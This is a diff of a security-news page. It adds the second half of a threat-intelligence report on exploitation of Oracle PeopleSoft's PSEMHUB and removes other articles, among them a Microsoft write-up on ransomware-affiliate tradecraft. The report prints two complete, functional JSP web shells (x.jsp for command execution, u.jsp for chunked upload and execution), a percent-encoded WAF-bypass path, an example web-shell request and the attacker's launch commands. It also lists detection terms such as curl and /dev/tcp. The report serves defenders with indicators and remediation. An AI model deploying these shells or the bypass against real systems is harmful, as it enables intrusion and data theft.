+, while WebLogic decodes the path and serves the application normally.
+Defenders should assume that threat actors may use any percent-encoded, mixed-case, or otherwise non-normalized variant of /PSEMHUB/
+, and should enforce blocking on the normalized path.
+Figure 2: PSEMHUB WAF bypass
+Exploitation
+We observed two exploitation methods, both abusing Java deserialization in the PSEMHUB hub servlet:
+-
+Web shell deployment. To access web shells behind some load balanced environments, the threat actor sent a burst of multiple
+POST
+requests to/%50SEMHUB/hub
+, followed by the creation of a new JSP files, such asx.jsp
+, or sequentially numbered JSP files in thePSEMHUB.war
+directory. The repetition likely ensures that every node behind a load balancer receives a copy of the web shell, so organizations should check all WebLogic nodes, not only the first one identified. -
+Fileless command execution.
+POST
+requests to/%50SEMHUB/hub
+that return command output directly in the HTTP response, with no file written to disk. On the host, this appears as shell processes (cmd.exe
+or/bin/sh
+) spawned by the WebLogic Java process. Detections that rely on JSP file creation will not identify this method.
+Post-Exploitation Tooling
+Dual Web Shells
+To establish persistent access and stage follow-on payloads, the threat actor deployed two complementary, single-line JSP web shells into the PSEMHUB.war
+directory. Both shells were designed to minimize web application firewall (WAF) detections during post-exploitation.
+The primary shell, x.jsp
+, provides cross-platform command execution. Rather than passing cleartext commands in URL query strings, x.jsp
+accepts hex-encoded commands via HTTP POST
+(c
+) along with an optional execution timeout (t
+). It automatically detects the underlying operating system, spawning cmd.exe
+on Windows or reconstructing /bin/sh
+from an ASCII character array on Linux to avoid static string signatures, and returns the process output prefixed with R:
+.
+<%@ page import="java.util.*,java.io.*" %><%
+String h = request.getParameter("c");
+String ts = request.getParameter("t");
+if (h != null) {
+int t = ts != null ? Integer.parseInt(ts) : 30;
+StringBuilder cs = new StringBuilder();
+for (int i = 0; i + 1 < h.length(); i += 2) {
+cs.append((char) Integer.parseInt(h.substring(i, i + 2), 16));
+}
+String c = cs.toString();
+boolean wn = System.getProperty("os.name").toLowerCase().contains("win");
+Process p = new ProcessBuilder(
+wn ? new String[]{"cmd.exe", "/c", c}
+: new String[]{new String(new char[]{47,98,105,110,47,115,104}), "-c", c}
+).start();
+InputStream a = p.getInputStream();
+InputStream g = p.getErrorStream();
+byte[] b = new byte[8192];
+int n;
+StringBuilder sb = new StringBuilder();
+long end = System.currentTimeMillis() + t * 1000L;
+while (System.currentTimeMillis() < end) {
+if (a.available() > 0) { n = a.read(b); if (n > 0) sb.append(new String(b, 0, n)); }
+else if (g.available() > 0) { n = g.read(b); if (n > 0) sb.append(new String(b, 0, n)); }
+else {
+try { p.exitValue(); break; }
+catch (IllegalThreadStateException e2) {
+try { Thread.sleep(40); } catch (Exception e3) {}
+}
+}
+}
+while (a.available() > 0) { n = a.read(b); if (n > 0) sb.append(new String(b, 0, n)); }
+while (g.available() > 0) { n = g.read(b); if (n > 0) sb.append(new String(b, 0, n)); }
+out.print("R:" + sb.toString());
+}
+%>
+Figure 3: x.jsp
+cross-platform command execution web shell (formatted for readability)
+When staging larger binaries on compromised Windows hosts, the threat actor deployed a second servlet, u.jsp
+(along with an offset-based variant, u2.jsp
+). This shell decodes Base64-encoded file chunks (a
+) and writes or appends them (m
+) to a target path (n
+) in 150 KB increments, bypassing HTTP request-size limits and avoiding PeopleSoft's native FILECHUNKING
+handlers. It also includes a secondary parameter (x
+) to execute cmd.exe
+commands once file reassembly is complete.
+<%@ page import="java.util.*,java.io.*,java.nio.file.*" %><%
+String n = request.getParameter("n");
+String a = request.getParameter("a");
+String m = request.getParameter("m");
+if (n != null && a != null) {
+try {
+byte[] b = java.util.Base64.getDecoder().decode(a);
+if ("a".equals(m)) {
+java.io.FileOutputStream f = new java.io.FileOutputStream(n, true);
+f.write(b);
+f.close();
+} else {
+java.nio.file.Files.write(java.nio.file.Paths.get(n), b);
+}
+out.print("W:" + b.length);
+} catch (Exception e) {
+out.print("E:" + e);
+}
+}
+String x = request.getParameter("x");
+if (x != null) {
+try {
+ProcessBuilder pb = new ProcessBuilder(new String[]{"cmd.exe", "/c", x});
+pb.redirectErrorStream(true);
+Process p = pb.start();
+java.io.InputStream i = p.getInputStream();
+byte[] buf = new byte[8192];
+int k;
+StringBuilder sb = new StringBuilder();
+long end = System.currentTimeMillis() + 12000;
+while (System.currentTimeMillis() < end) {
+if (i.available() > 0) {
+k = i.read(buf);
+if (k > 0) sb.append(new String(buf, 0, k));
+} else {
+try { p.exitValue(); break; }
+catch (Exception e2) { Thread.sleep(30); }
+}
+}
+out.print("R:" + sb.toString());
+} catch (Exception e) {
+out.print("X:" + e);
+}
+}
+%>
+Figure 4: u.jsp
+chunked file upload and execution web shell (formatted for readability)
+Trojanized Installer and Multi-Stage Backdoor (Ple64.exe
+)
+On compromised Windows servers, the threat actor used u.jsp
+(and u2.jsp
+) to upload and execute a 5.2 MB binary named Ple64.exe
+(tracked as SIDEEYE) inside the PSEMHUB.war
+directory. While Ple64.exe
+masquerades as a signed installer for the Light Alloy media player, analysis revealed that it is a trojanized installer containing a three-stage execution chain that loads SIDEEYE in memory. The analyzed sample was signed with a valid Extended Validation (EV) certificate issued to Tobias Weihmann Software Development OU
+via Sectigo. GTIG has contacted Sectigo for revocation of this certificate.
+When executed, Ple64.exe
+(Stage 1) decompresses and loads a VMProtect 3 (VMP3)-protected second-stage launcher into memory. This launcher decrypts additional data blocks embedded within Ple64.exe
+and loads and executes the third stage in memory. Stage 3 is the SIDEEYE C++ backdoor that communicates with its command-and-control (C2) server (162[.]219[.]30[.]165
+) over raw TCP using separate control (TCP/3333
+) and data (TCP/3334
+) ports.
+Initial analysis indicates that SIDEEYE supports:
+-
+Browser and desktop application credential theft
+-
+Process and file management
+-
+Interactive reverse shell and reverse proxy capabilities
+After uploading the binary in chunks via u.jsp
+, the threat actor verified the reassembled file size on disk, launched Ple64.exe
+as a background process, and confirmed that it remained running:
+dir applications\peoplesoft\PSEMHUB.war\Ple64.exe
+for %F in (applications\peoplesoft\PSEMHUB.war\Ple64.exe) do @echo %~zF
+cmd.exe /c start /b "" applications\peoplesoft\PSEMHUB.war\Ple64.exe
+tasklist | findstr /i Ple64
+Figure 5: Threat actor verifying upload and execution of the trojanized Ple64.exe
+(SIDEEYE) backdoor
+Tunneling with Neo-reGeorg
+Alongside the deployment of Ple64.exe
+, the threat actor staged the open-source Neo-reGeorg tunneling toolkit and deployed its tunnel.jsp
+and tunnel.jspx
+servlets into victim web directories. This toolkit routes SOCKS5 proxy traffic through ordinary HTTP and HTTPS connections to the web tier, enabling internal discovery and lateral movement from the PeopleSoft host.
+MeshAgent
+To establish persistent access after web shell placement on Linux systems, UNC6240 deployed the legitimate RMM tool MeshAgent.
+In earlier May and July 2026 intrusions, the actor dropped unencrypted agent binaries and configuration files directly into /tmp
+(meshagent
+, meshagent.msh
+, and meshagent.db
+) under the PeopleSoft service account, routing outbound connections to Microsoft-masquerading domains including azurenetfiles.net
+, microsoft-entra.net
+, and enroll.azuredevice.cloud
+.
+In September 2026 intrusions, UNC6240 continued to use IT-themed infrastructure associated with MeshAgent (winmanage-me.network
+on 104.219.234.138
+) for secondary staging and management.
+MeshCentral is a legitimate open-source remote management platform that threat actors, including UNC6240, use to maintain interactive access to victim systems over web sockets.
+Observed Post-Exploitation Commands
+Across compromised instances, a quarter of the threat actor's commands executed as root
+or NT Authority\SYSTEM
+, granting full control of the operating system. The remaining commands were executed under PeopleSoft or WebLogic service accounts, which still provide access to PeopleSoft configuration files, database connection strings, and application data.
+Command activity through the web shells fell into several categories:
+-
+Host and user discovery, including
+hostname
+andwhoami
+. -
+Process verification, polling process listings with
+tasklist
+to verify payload execution.
+An example web shell request using the encoded path follows:
+GET /%50SEMHUB/<webshell>.jsp?c=id;hostname;uname+-a HTTP/1.1
+Figure 6: Example web shell request
+Remediation and Hardening
+Patch and Reduce Exposure
+Apply the Oracle Security Alert for CVE-2026-35273 and remain on supported PeopleTools versions. Disable the EMHub service if it is not used for patching or remove the PSEMHUB application. EMHub and the Integration Broker listening connector are administrative and system-to-system components, and restricting them from public internet access is non-breaking for standard PeopleSoft Internet Architecture (PIA) user sessions.
+Log and Endpoint Monitoring
+Search PIA WebLogic access logs for requests to /PSEMHUB/
+and encoded variants, POST
+requests to /hub
+with bodies from external sources, and requests to unexpected .jsp
+or .jspx
+files under PSEMHUB or PORTAL. On hosts, alert on shell processes (cmd.exe
+, /bin/sh
+, bash
+) spawned by the WebLogic Java process, particularly those invoking base64 -d
+, curl
+, /dev/tcp
+, tasklist
+, or start /b
+.
+Host-Level Auditing
+Scan PSEMHUB.war/
+and PORTAL.war/
+for unexpected .jsp
+, .jspx
+, and .exe
+files, inspect .../PSEMHUB.war/envmetadata/transactions/
+for unauthorized content, and check for unexpected MeshCentral agents. Organizations that identify a web shell should treat the host as compromised, preserve evidence, and rotate all credentials accessible from the PeopleSoft tier, prioritizing hosts where the WebLogic service runs as root
+or SYSTEM
+.
+Hunt for Evidence of Data Theft
+Review PeopleSoft and database hosts for large archive files (.tar, .tar.gz, .zst) in temporary or web-accessible directories, and for tar, zstd, rsync, sshpass, or curl processes spawned by the PeopleSoft or WebLogic service accounts. Review database audit logs for bulk queries or exports against HR, payroll, and student records tables, and network logs for large or sustained outbound transfers from the PeopleSoft tier, including rsync (TCP 873), SSH, and HTTP POST traffic to the network indicators listed in this post.
+Prepare for Extortion
+UNC6240 has a well-established pattern of data theft extortion, that is, stealing data and threatening to release it on a data leak site unless the victim pays a ransom. Affected organizations should prepare for extortion communications and monitor for potential public exposure of stolen data.
+Indicators of Compromise (IOCs)
+To assist the wider community in hunting and identifying activity outlined in this blog post, we have included IOCs in a [GTI collection for registered users](https://www.virustotal.com/gui/collection/23dd0be8f55d6ab7e425806a1a02847a8898bdfe0b7e9c1745e558240147532b/summary).
+Network Indicators
+Table 1: Network indicators
+Host Indicators
+<PS_CFG_HOME>/webserv/<domain>/applications/peoplesoft/PSEMHUB.war/x.jsp
+<PS_CFG_HOME>/webserv/<domain>/applications/peoplesoft/PSEMHUB.war/u.jsp
+<PS_CFG_HOME>/webserv/<domain>/applications/peoplesoft/PSEMHUB.war/Ple64.exe
+<PS_CFG_HOME>/webserv/<domain>/applications/peoplesoft/PSEMHUB.war/tunnel.jsp
+<PS_CFG_HOME>/webserv/<domain>/applications/peoplesoft/PSEMHUB.war/tunnel.jspx
+Figure 7: Host indicators
+URI pattern: /%50SEMHUB/
+(percent-encoded WAF bypass path; defenders should assume that threat actors may use any percent-encoded, mixed-case, or otherwise non-normalized variant of /PSEMHUB/ and enforce blocking on the normalized path).
+File Indicators
+Table 2: File indicators
+Google Security Operations
+Google Security Operations customers will have access to the following rules. These rules will be available under the Mandiant Frontline Threats rule pack:
+-
+Oracle PeopleSoft Configuration Inspection
+-
+Sshpass Interactive File Deployment
+-
+Data Archiving or Compression via Zstd Utility
+-
+MeshCentral Command Execution via Meshctrl
+Pending deployment in the Mandiant Frontline Threats rule pack:
+-
+Oracle PeopleSoft Suspicious File Write to Web Application Archive Directory
+MITRE ATT&CK Mapping
+Table 3: MITRE ATT&CK</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-6" class="article-body">
             <h2 class="article-title">Roundcube Pre-Auth SQL Injection Flaw Actively Exploited in the Wild</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/09/roundcube-pre-auth-sql-injection-flaw.html" target="_blank">Original Link</a></p>
             <div class="content-text">The Canadian Centre for Cyber Security has warned that a now-patched Roundcube Webmail vulnerability is being actively exploited in the wild.
@@ -81,145 +525,7 @@ Way back in February 2026, two other vulnerabilities in the same product (CVE-20
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-1" class="article-body">
-            <h2 class="article-title">WSO2 and Adobe Commerce Flaws Exploited in Attacks, Added to CISA KEV</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/09/wso2-and-adobe-commerce-flaws-exploited.html" target="_blank">Original Link</a></p>
-            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on Thursday, [added](https://www.cisa.gov/news-events/alerts/2026/09/24/cisa-adds-two-known-exploited-vulnerabilities-catalog) two critical security flaws impacting WSO2 and Adobe Commerce and Magento to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, based on evidence of active exploitation.
-The vulnerabilities are listed below -
-[CVE-2026-5430](https://thehackernews.com/2026/09/active-exploitation-attempts-target.html)(CVS score: 9.8) - A path traversal vulnerability in WSO2 API Control Plane, API Manager, Traffic Manager and Universal Gateway that could allow unrestricted file upload and lead to remote code execution.[CVE-2026-71362](https://thehackernews.com/2026/08/adobe-patches-three-cvss-100-coldfusion.html)(CVSS score: 9.1) - An incorrect authorization vulnerability in Adobe Commerce and Magento that could allow an attacker to leverage this vulnerability to gain elevated access to sensitive resources without any user interaction.
-The addition of CVE-2026-5430 to the KEV comes a little over a week after watchTowr said it's seeing in-the-wild exploitation efforts against its honeypots since at least September 13, 2026.
-"We captured forged JWT tokens targeting the flaw on September 13 and reproduced the vulnerability ourselves, despite the lack of public technical details," Yordan Ganchev, principal threat intelligence specialist at watchTowr, said in a statement. "That gave us direct evidence that this wasn't merely a theoretical vulnerability or a critical severity score on paper. It was exploitable, and attackers were already acting on it. "
-"It's worth reiterating that WSO2 isn't a niche target. Its technology is used by nearly 1,000 customers across banking, government, telecommunications, and logistics. Organizations in these sectors can't afford to wait for exploitation to be formally confirmed. By the time a vulnerability reaches the KEV catalog, attackers already have days, or, in this instance, weeks, to act."
-As for [CVE-2026-71362](https://github.com/dinosn/cve-2026-71362-magento-lab), Sansec noted in August 2026 that it had detected and blocked exploitation attempts aimed at the flaw.
-"The vulnerability lets attackers switch a customer session to another customer account," the Dutch e-commerce security company [said](https://sansec.io/research/adobe-commerce-account-takeover-apsb26-92). "This gives them access to the victim's account and private customer data."
-Previdian's telemetry [indicates](https://previdian.com/CVE-2026-71362#telemetry) that a lone IP address from Australia attempted to exploit the flaw targeting its honeypot sensors on September 10, 2026. Adobe has yet to update its advisory to confirm exploitation status.
-Federal Civilian Executive Branch (FCEB) agencies are advised to apply fixes for both vulnerabilities by September 27, 2026, to safeguard their networks against active threats.
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-2" class="article-body">
-            <h2 class="article-title">MacSync malware uses public iCloud calendars to deliver new payloads</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/macsync-malware-uses-public-icloud-calendars-to-deliver-new-payloads/" target="_blank">Original Link</a></p>
-            <div class="content-text">A new variant of the MacSync malware targeting macOS systems now uses public iCloud calendar events to deliver new native payloads. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-3" class="article-body">
-            <h2 class="article-title">Beyond the ransomware: Tracking Storm-2570’s consistent tradecraft across deployments</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/09/24/beyond-ransomware-tracking-storm-2570-consistent-tradecraft-across-deployments/" target="_blank">Original Link</a></p>
-            <div class="content-text">Activity associated with Storm-2570, a ransomware affiliate linked to multiple ransomware payloads, illustrates how tracking and responding to ransomware attacks by payload alone can obscure the affiliates carrying out intrusions and the recurring behaviors that defenders can use to detect and disrupt them. Microsoft Threat Intelligence has observed Storm-2570 using consistent post-compromise tools and techniques across deployments involving Qilin, DragonForce, Anubis, and BERT ransomware. Across multiple investigations, Storm-2570 has maintained largely uniform tradecraft, infrastructure overlaps, and repeated use of the same remote access and cloud exfiltration tooling despite operating across multiple ransomware ecosystems.
-These findings reinforce the value of examining threat actor behavior across the attack chain rather than treating each ransomware payload as an isolated activity set. Recurring remote access, credential access, lateral movement, security tampering, and data exfiltration activity can help defenders connect related intrusions and respond before ransomware deployment, even when the final payload changes.
-In this blog post, we delve into the attack techniques attributed to Storm-2570. While Storm-2570’s methodology aligns with the tactics, techniques, and procedures (TTPs) of many tracked ransomware actors, analysis of their post-compromise tactics provides essential insights into how organizations can harden and defend against ransomware threat actors, informing opportunities to disrupt attackers even if they have gained initial access to a network. At the end of this blog, we also provide a comprehensive recommendation section with detection details.
-Who is Storm-2570?
-Storm-2570 is a ransomware affiliate that Microsoft Threat Intelligence has tracked since April 2025. We assess that Storm-2570 has operated across multiple [ransomware as a service (RaaS)](https://www.microsoft.com/en-us/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/)[ ecosystems, including Qilin, DragonForce, Anubis, and BERT.]
-To date, Microsoft Threat Intelligence has observed Storm-2570 in multiple investigated intrusions affecting organizations in United States, Canada, United Kingdom, Spain, Netherlands, and Puerto Rico, including healthcare and public health, education, government agencies and services, financial services, energy, consumer retail, Information technology (IT), food and agriculture, consumer services, commercial facilities, non-government organization (NGO), chemicals, critical manufacturing, and transportation.
-Unlike actors that consistently support a single ransomware operation, Storm-2570 appears to be a cross-ecosystem threat actor that works with multiple ransomware groups and shifts between operations as opportunities arise, giving the threat actor the flexibility to use and deploy multiple families and improve opportunities for payouts. As a result, organizations could encounter the same actor, tools, and intrusion methods despite different ransomware payloads being deployed.
-Storm-2570 attack chain: From initial foothold to impact
-While the method through which Storm-2570 gains initial access remains unconfirmed, observed intrusion chains indicate subsequent use of remote management tooling and hands-on-keyboard activity to progress toward credential access, lateral movement, exfiltration, and ransomware deployment.
-Across incidents, Microsoft has observed the use of commodity tools in the pre-ransom attack stage even when the ransomware payload changed. These tools include:
-- Remote monitoring and management (RMM) tools, including Atera, MeshAgent, ScreenConnect, Splashtop, Remotely_Agent, and NinjaRMM
-- Discovery and lateral movement tools, including NetScan, Nmap, PsExec, Impacket, NetExec, and Remote Desktop Protocol (RDP) batch scripts
-- Data collection and exfiltration tools, including s5cmd and Rclone
-These tools enable remote administration, command execution, persistence, and tunneling or proxy access.
-Frequent use of remote management tooling across the attack chain
-MeshAgent, a remote device management software, stands out as one of Storm-2570’s most frequently observed remote access and execution tools across multiple intrusions. Rather than appearing as a one-off utility, MeshAgent repeatedly shows up at key points in Storm-2570 attack chains, often after the actor has gained access and is preparing to expand control, run commands, deploy additional tooling, or move toward ransomware impact. In several cases, Storm-2570 used MeshAgent along with MeshCentral as an operational bridge between initial hands-on-keyboard activity and later-stage actions, such as account manipulation, discovery, credential access, security tampering, and ransomware deployment.
-Many intrusions tracked by Microsoft have shown Storm-2570 tailoring MeshAgent deployments to the compromised environment. The actor renames MeshAgent-related binaries or services with victim-themed names, likely to make the tool appear more legitimate in the environment. For example, Storm-2570 renames the variant of the meshagent64 RMM tool to include the name of the compromised organization, such as meshagent64-[organization name].exe and uses Base64-encoding to obfuscate the commands being executed. In one such intrusion, MeshAgent was used alongside NinjaRMM before the activity progressed to ntdsutil for credential dumping, network scanning, and Qilin deployment.
-Storm-2570 uses a diverse set of remote access tools rather than relying on a single capability. The threat actor rotates among commercially available RMM platforms, remote desktop components, and tunneling utilities, often deploying multiple tools during the same intrusion. For example, Storm-2570 uses Atera to install agents and execute interactive commands, while ngrok and Cloudflared.exe expose RDP services or establish persistent outbound tunnels. Storm-2570 uses AteraAgent to issue commands and to further download and install Splashtop Streamer in compromised environments. Splashtop appears to be the interactive remote control component delivered through Atera, giving the threat actor hands-on keyboard access. The actor also uses tools such as ScreenConnect for command execution and account or domain reconnaissance and installs Remotely_Agent as a persistent remote management service.
-Use of tunneling utilities for persistent remote access
-Storm-2570 also pairs remote access tooling with tunneling utilities such as Cloudflared.exe to create resilient outbound access paths. In one intrusion, Storm-2570 installed MeshAgent and later created a persistent Cloudflare Tunnel service on the victim host. The tunnel was configured to run automatically as a service under LocalSystem, allowing the threat actor to maintain an encrypted outbound channel from inside the network. This type of tunnel can help bypass inbound firewall restrictions and provide covert remote access for follow-on activity.
-Discovery and credential access
-Post-compromise, Storm-2570 routinely conducts internal network discovery using tools such as NetScan, SoftPerfect Network Scanner Portable, and Nmap, alongside native discovery commands and file-searching activity. These activities are used to identify reachable hosts and services, map internal networks and remote systems, and locate systems, network shares, and files that may facilitate data collection, credential access, or encryption operations.
-For credential access and harvesting, Storm-2570 uses tools like Mimikatz, LaZagne, and pypykatz. Storm-2570 also uses ntdsutil in intrusions for NTDS.dit credential dumping, a credential theft technique against Active Directory domain credentials. The ntdsutil command usage pattern is consistent with creating an Install From Media (IFM) copy of Active Directory database material. In an intrusion context, attackers can use this to obtain NTDS.dit and related registry hives for offline extraction of password hashes and credential material.
-The command uses the legitimate Windows ntdsutil.exe to activate the NTDS Active Directory instance and create a full IFM backup in C:\Windows\Temp\<XXXXXXXXX>.
-Storm-2570 uses this command to dump or stage Active Directory database NTDS.dit and supporting registry hive material, then copy it off-host and potentially extract domain credential hashes offline, indicating that the actor has high-privilege access to a victim’s domain controller:
-Defense evasion
-After acquiring privileged credentials, Storm-2570 uses defense evasion tactics preceding ransomware deployment, including antivirus tampering and the modification of Microsoft Defender settings and Defender exclusions. In multiple observed intrusions, Storm-2570 disabled real-time monitoring, added Defender exclusions for C:\PerfLogs to weaken endpoint detections, and modified registry values under Microsoft Defender service keys to further impair protections.
-These tactics are consistent across Storm-2570 ransomware intrusions involving Qilin, DragonForce, and Anubis deployment, including cases where the actor used registry changes to alter DisableAntiSpyware, DisableRealtimeMonitoring, and WinDefend service behavior.
-Lateral movement and deployment preparation
-Storm-2570 moves into lateral movement and deployment preparation phase typically by using a mix of legitimate administrative tooling, offensive frameworks, and remote execution utilities.
-Across multiple investigated intrusions, Storm-2570 was observed leveraging PsExec, Impacket, NetExec, RDP batch scripts, and admin shares to reach additional systems, execute commands remotely, and stage tooling across the environment. The actor uses these capabilities to facilitate data exfiltration and prepare victim networks for ransomware deployment. These tools frequently appear alongside earlier discovery activity, credential access, and remote access tooling such as MeshAgent, and often precede the use of s5cmd for exfiltration or ransomware payload execution.
-PsExec is one of the most consistent lateral movement and deployment tools used by Storm-2570. The actor frequently uses PsExec, sometimes with host lists such as @ip.txt, to move laterally and install renamed MeshAgent binaries across compromised environments. Storm-2570 utilizes MeshAgent during the lateral movement phase in several intrusions as a remote access tool deployed onto newly compromised systems.
-The following are examples of PsExec commands with host lists @ip.txt:
-Storm-2570 also uses RDP and RDP-enabling scripts as part of this phase. If RDP is not allowed in the environment, Storm-2570 needs admin privileges to modify the policy and enable it. In several intrusions, rdp.bat script appeared with PsExec, including cases where PsExec ran rdp.bat across hosts using @ip.txt.
-The RDP batch script (rdp.bat) enables inbound Remote Desktop access by modifying Terminal Server settings and adding a firewall rule to allow TCP port 3389, as observed in the command below:
-Additionally, the threat actor uses ngrok to expose TCP 3389 (default port for RDP), after which PsExec-related activity and security tampering appears. These examples show Storm-2570 combining RDP access, tunneling, and remote execution to sustain hands-on-keyboard control and reach additional systems.
-Storm-2570’s use of Impacket and NetExec over Server Message Block (SMB) further supports their lateral movement pattern. Impacket is a collection of open-source Python classes designed for working with network protocols, and is popular with adversaries due to its ease of use and wide range of capabilities. Microsoft Defender for Endpoint has a dedicated attack surface reduction rule to [defend against lateral movement techniques](https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference#block-process-creations-originating-from-psexec-and-wmi-commands) used by Impacket; [protecting lateral movement pathways](https://www.microsoft.com/en-us/security/blog/2022/10/26/how-to-prevent-lateral-movement-attacks-using-microsoft-365-defender/) can also mitigate Impacket.
-The following NetExec SMB command is used to conduct credential theft and reconnaissance against internal Windows hosts:
-Data collection and exfiltration
-Storm-2570 frequently performs data theft using cloud and file-transfer utilities that are capable of moving large volumes of data quickly from compromised environments to a remote attacker-owned cloud resource. Microsoft has observed Storm-2570 using s5cmd or Rclone to stage and exfiltrate data, often after the actor has already completed discovery, credential access, lateral movement, and remote access setup. Tools like Rclone provide data synchronization capabilities, moving newly created or updated files to cloud resources in real-time to enable continuous exfiltration throughout all stages of the attack without needing attacker interaction.
-Most commonly, Storm-2570 relies on s5cmd, a command-line utility designed for managing Amazon S3 and compatible object storage services, for S3-based exfiltration. In multiple intrusions, the actor staged s5cmd.exe alongside a credentials file and used it to copy documents, spreadsheets, images, databases, mail-related files, archives, and other business-relevant file types to S3 buckets. Storm-2570 identifies high-value drives and network shares, stages s5cmd.exe and a credentials file, and then executes run copy (cp) operations with extension filters to transfer selected data to attacker-controlled S3 buckets. To interact with the destination S3 bucket, s5cmd requires credentials for authentication and the credentials file stores the AWS access keys for authentication to the S3 bucket.
-The following is an example of s5cmd data exfiltration command lines:
-Overall, Storm-2570’s exfiltration tradecraft shows a strong preference for tools that blend into legitimate administrative or cloud-transfer workflows, allowing double-extortion operations: first collecting sensitive data through cloud-transfer tooling, then deploying ransomware.
-What Storm-2570 activity means for defenders
-Storm-2570 illustrates common human-operated ransomware attacks and how modern ransomware affiliates increasingly operate independently of a single ransomware brand. Ransomware affiliates’ use of common tools, intrusion methods, and operational patterns remain remarkably consistent. Although Storm-2570’s techniques are not novel, recognizing the patterns used by ransomware affiliates can be important for defenders to know to improve prevention, detection, and incident response.
-Mitigation and protection guidance
-To defend against Storm-2570 TTPs and similar activity, Microsoft recommends the following mitigation measures:
-- Follow the
-[defending against ransomware guidance](https://www.microsoft.com/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/#defending-against-ransomware?ocid=magicti_ta_blog)in Microsoft’s ransomware as a service blog post which details how to build credential hygiene as well as how to limit lateral movement using the principle of least privilege. - Turn on tenant-wide
-[tamper protection](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?ocid=magicti_ta_learndoc)features to prevent attackers from stopping security services or using antivirus exclusions. Without tamper protection, attackers could simply turn off Microsoft Defender Antivirus without the need to acquire higher privileges.- Customers running Intune or Microsoft Defender for Endpoint Security Configuration can
-[enable DisableLocalAdminMerge to prevent modification of antivirus exclusions via GPO](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/manage-tamper-protection-intune?ocid=magicti_ta_learndoc#tamper-protection-for-antivirus-exclusions).
-- In addition to tamper protection, you can also
-[enable and configure Microsoft Defender Antivirus always-on protection in Group Policy](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/configure-real-time-protection-microsoft-defender-antivirus?ocid=magicti_ta_learndoc).
-- If there is an issue with a device during roll out of various antivirus features, the device can be placed in
-[Troubleshooting mode](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/enable-troubleshooting-mode?ocid=magicti_ta_learndoc)to turn off Tamper Protection temporarily without impacting the wider organizational security policy.
-- Customers running Intune or Microsoft Defender for Endpoint Security Configuration can
-- For approved RMM systems used in your environment, enforce security settings where possible to implement MFA. If an unapproved RMM installation is discovered in your network, reset passwords for accounts used to install the RMM services. If a System-level account was used to install the software, further investigation may be warranted.
-- Configure
-[automatic attack disruption](https://learn.microsoft.com/defender-xdr/configure-attack-disruption)in Microsoft Defender XDR. Automatic attack disruption is designed to contain attacks in progress, limit the impact on an organization’s assets, and provide more time for security teams to remediate the attack fully. - Microsoft Defender XDR customers can turn on
-[attack surface reduction rules](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction?view=o365-worldwide)to prevent common attack techniques used in ransomware attacks:[Block process creations originating from PSExec and WMI commands](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-process-creations-originating-from-psexec-and-wmi-commands)(Some organizations might experience compatibility issues with this rule on certain server systems but should deploy it to other systems to prevent lateral movement originating from PsExec and WMI.)
-Microsoft Defender detections
-[Microsoft Defender](https://www.microsoft.com/security/business/microsoft-defender) customers can refer to the list of applicable detections below. Microsoft Defender coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.
-| Tactic | Observed activity | Microsoft Defender coverage |
-| Execution | Storm-2570 delivers tools such as PsExec, Impacket, NetExec, and RDP batch scripts, to carry out post-compromise activity |
-– Behavior:Win32/PsexecRemote
-– Hands-on-keyboard attack involving multiple devices – Remote access software – Suspicious PowerShell command line – Suspicious PowerShell download or encoded command execution – Ransomware-linked threat actor detected |
-[Microsoft Defender for Endpoint](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint)– Suspicious Atera activity
-– File dropped and launched from remote location
-[Microsoft Defender for Endpoint](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint)– Defender detection bypass
-– Attempt to turn off Microsoft Defender Antivirus protection
-[Microsoft Defender Antivirus](https://www.microsoft.com/windows/comprehensive-security)– HackTool:Win32/Mimikatz – HackTool:Win64/Mimikatz – HackTool:Linux/LaZagne – HackTool:Win32/LaZagne – HackTool:Win64/LaZagne[Microsoft Defender for Endpoint](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint)– Exposed credentials at risk of compromise
-– Compromised account credentials
-– Process memory dump
-[Microsoft Defender for Endpoint](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint)– Potential human-operated malicious activity
-– Renaming of legitimate tools for possible data exfiltration
-– Possible data exfiltration
-– Hidden dual-use tool launch attempt
-[Microsoft Defender Antivirus](https://www.microsoft.com/windows/comprehensive-security)– Ransom:Win32/Qilinloader – Behavior:Win32/Ransomware!Qilin – Ransom:Linux/Qilin – Ransom:Win32/Qilin – Ransom:Win32/DragonForce – Ransom:Win64/Anubis
